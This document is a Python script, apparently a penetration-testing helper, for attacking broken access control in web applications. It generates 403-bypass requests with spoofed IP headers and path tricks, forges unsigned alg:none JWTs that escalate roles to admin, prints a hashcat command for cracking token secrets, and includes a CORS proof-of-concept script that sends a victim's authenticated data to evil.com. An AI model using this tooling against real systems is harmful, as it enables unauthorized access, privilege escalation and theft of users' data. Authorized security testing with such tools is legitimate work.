#!/usr/bin/env python3
"""
bac_helper.py — Broken Access Control Testing Helper

Usage:
    python3 bac_helper.py paths                        # common admin/restricted paths
    python3 bac_helper.py bypass-403 https://target.com/admin
    python3 bac_helper.py jwt-tamper TOKEN
    python3 bac_helper.py cors https://target.com/api/me TOKEN
    python3 bac_helper.py methods https://target.com/admin/users TOKEN
"""
import sys, base64, json, urllib.request, urllib.parse

# ── Common Restricted Paths ──────────────────────────────────────────────────

ADMIN_PATHS = [
    "/admin", "/administrator", "/admin.php", "/admin/login", "/admin/dashboard",
    "/dashboard", "/manager", "/console", "/control-panel", "/controlpanel",
    "/superadmin", "/superuser", "/root",
    "/api/admin", "/api/v1/admin", "/api/internal", "/api/private",
    "/api/v1/users", "/api/v1/users/all", "/api/v1/accounts",
    "/users", "/users/list", "/accounts", "/members",
    "/config", "/settings", "/setup", "/install", "/configuration",
    "/backup", "/backup.zip", "/backup.sql", "/db.sql", "/database.sql",
    "/.git", "/.env", "/web.config", "/config.php", "/config.yml",
    "/actuator", "/actuator/env", "/actuator/heapdump", "/actuator/beans",
    "/swagger-ui", "/swagger-ui.html", "/swagger-ui/", "/api-docs",
    "/openapi.json", "/openapi.yaml", "/v1/api-docs",
    "/jenkins", "/phpmyadmin", "/grafana", "/kibana", "/solr/admin",
    "/wp-admin", "/wp-admin/", "/wp-login.php",
    "/manager/html",  # Tomcat
    "/jmx-console",   # JBoss
    "/debug", "/test", "/dev", "/staging",
]

def show_paths():
    print("\n[+] Common admin/restricted paths to probe:\n")
    for p in ADMIN_PATHS:
        print(f"  {p}")
    print(f"\n  ffuf command:\n")
    print(f'  ffuf -u https://TARGET.com/FUZZ \\')
    print(f'       -w /usr/share/seclists/Discovery/Web-Content/common.txt \\')
    print(f'       -mc 200,301,302,401,403 \\')
    print(f'       -fc 404 -t 50\n')

# ── 403 Bypass ───────────────────────────────────────────────────────────────

BYPASS_HEADERS = [
    ("X-Original-URL",        "{path}"),
    ("X-Rewrite-URL",         "{path}"),
    ("X-Custom-IP-Authorization", "127.0.0.1"),
    ("X-Forwarded-For",       "127.0.0.1"),
    ("X-Real-IP",             "127.0.0.1"),
    ("X-Remote-IP",           "127.0.0.1"),
    ("X-Remote-Addr",         "127.0.0.1"),
    ("X-Host",                "localhost"),
    ("X-Forward-Host",        "localhost"),
    ("X-Originating-IP",      "127.0.0.1"),
    ("Client-IP",             "127.0.0.1"),
    ("True-Client-IP",        "127.0.0.1"),
    ("Forwarded",             "for=127.0.0.1"),
]

def path_variants(path):
    variants = [
        path,
        path + "/",
        path.upper(),
        path.lower(),
        "/" + path.lstrip("/").capitalize(),
        path + "/..",
        path + "/.",
        path + "%20",
        path + "%09",
        path + ";/",
        "/" + "/".join([".."] * path.count("/")) + path,
    ]
    # URL encoding tricks
    encoded = ""
    for c in path.lstrip("/"):
        encoded += f"%{ord(c):02x}"
    variants.append("/" + encoded)
    variants.append(path.replace("/", "/%2f"))
    variants.append(path.replace("/", "/./"))
    variants = list(dict.fromkeys(variants))  # deduplicate
    return variants

def bypass_403(url):
    parsed = urllib.parse.urlparse(url)
    path = parsed.path
    base = f"{parsed.scheme}://{parsed.netloc}"
    print(f"\n[+] 403 Bypass attempts for: {url}\n")

    print("  === Path variants ===")
    for v in path_variants(path):
        full = base + v
        print(f"  curl -s -o /dev/null -w '%{{http_code}}' '{full}'")

    print("\n  === Header-based bypass (with original URL) ===")
    for header, value in BYPASS_HEADERS:
        val = value.replace("{path}", path)
        print(f"  curl -s -o /dev/null -w '%{{http_code}} {header}' '{base}/' -H '{header}: {val}'")

    print("\n  === HTTP method switch ===")
    for method in ["POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS", "TRACE"]:
        print(f"  curl -X {method} -s -o /dev/null -w '%{{http_code}} {method}' '{url}'")

    print()

# ── JWT Tamper ───────────────────────────────────────────────────────────────

def b64pad(s):
    return s + "=" * (-len(s) % 4)

def jwt_tamper(token):
    parts = token.split(".")
    if len(parts) != 3:
        print("[!] Not a valid JWT"); return
    header  = json.loads(base64.urlsafe_b64decode(b64pad(parts[0])))
    payload = json.loads(base64.urlsafe_b64decode(b64pad(parts[1])))
    print(f"\n[+] JWT Analysis\n")
    print(f"  Header : {json.dumps(header)}")
    print(f"  Payload: {json.dumps(payload)}\n")

    escalations = []
    for k, v in payload.items():
        if k in ("role","roles","user_role","group","groups") and v != "admin":
            escalations.append((k, "admin"))
        if k in ("is_admin","admin","is_superuser","superuser","is_staff") and v is False:
            escalations.append((k, True))
        if k in ("user_id","uid","id") and str(v) != "1":
            escalations.append((k, 1))

    if escalations:
        print("  [!] Suggested escalations:")
        for k, v in escalations:
            print(f"    {k}: {payload[k]} → {v}")
    else:
        print("  [~] No obvious escalation fields found. Try adding: is_admin, role, admin")

    # Forge alg:none
    new_header  = base64.urlsafe_b64encode(
        json.dumps({"alg":"none","typ":"JWT"}).encode()
    ).rstrip(b"=").decode()
    new_payload = dict(payload)
    for k, v in escalations:
        new_payload[k] = v
    new_payload_enc = base64.urlsafe_b64encode(
        json.dumps(new_payload).encode()
    ).rstrip(b"=").decode()
    forged = f"{new_header}.{new_payload_enc}."
    print(f"\n  [+] Forged alg:none token (try this):\n  {forged}\n")
    print(f"  [+] Hashcat crack command (if HMAC):")
    print(f"  hashcat -a 0 -m 16500 {token[:40]}... /usr/share/wordlists/rockyou.txt\n")

# ── CORS ──────────────────────────────────────────────────────────────────────

def cors_test(url, token=None):
    parsed = urllib.parse.urlparse(url)
    host   = parsed.netloc
    test_origins = [
        "https://evil.com",
        "null",
        f"https://evil.{host}",
        f"https://{host}.evil.com",
        f"https://notreal{host}",
    ]
    print(f"\n[+] CORS Misconfiguration Test: {url}\n")
    for origin in test_origins:
        headers = {"Origin": origin}
        if token:
            headers["Authorization"] = f"Bearer {token}"
        req = urllib.request.Request(url, headers=headers)
        try:
            with urllib.request.urlopen(req, timeout=6) as r:
                acao = r.headers.get("Access-Control-Allow-Origin","(none)")
                acac = r.headers.get("Access-Control-Allow-Credentials","(none)")
                vuln = "  [!!!] VULNERABLE" if (acao == origin and acac.lower() == "true") else ""
                print(f"  Origin: {origin}")
                print(f"    ACAO={acao}  ACAC={acac}{vuln}\n")
        except Exception as e:
            print(f"  Origin: {origin} → {type(e).__name__}: {e}\n")

    print("  PoC (if vulnerable):")
    print(f"""  <script>
  fetch("{url}", {{credentials:"include"}})
    .then(r=>r.text())
    .then(d=>fetch("https://evil.com/?d="+btoa(d)));
  </script>\n""")

# ── HTTP Methods ─────────────────────────────────────────────────────────────

def test_methods(url, token=None):
    print(f"\n[+] HTTP Method Test: {url}\n")
    methods = ["GET","POST","PUT","PATCH","DELETE","HEAD","OPTIONS","TRACE"]
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    for method in methods:
        req = urllib.request.Request(url, headers=headers, method=method)
        if method in ("POST","PUT","PATCH"):
            req.data = b"{}"
            req.add_header("Content-Type","application/json")
        try:
            with urllib.request.urlopen(req, timeout=5) as r:
                print(f"  {method:<8} → {r.status}")
        except urllib.error.HTTPError as e:
            print(f"  {method:<8} → {e.code}")
        except Exception as e:
            print(f"  {method:<8} → ERROR: {e}")
    print()

# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    args = sys.argv[1:]
    if not args:
        print(__doc__); sys.exit(0)
    cmd = args[0]
    if cmd == "paths":
        show_paths()
    elif cmd == "bypass-403":
        url = args[1] if len(args) > 1 else "https://target.com/admin"
        bypass_403(url)
    elif cmd == "jwt-tamper":
        token = args[1] if len(args) > 1 else ""
        jwt_tamper(token)
    elif cmd == "cors":
        url   = args[1] if len(args) > 1 else ""
        token = args[2] if len(args) > 2 else None
        cors_test(url, token)
    elif cmd == "methods":
        url   = args[1] if len(args) > 1 else ""
        token = args[2] if len(args) > 2 else None
        test_methods(url, token)
    else:
        print(__doc__)

if __name__ == "__main__":
    main()
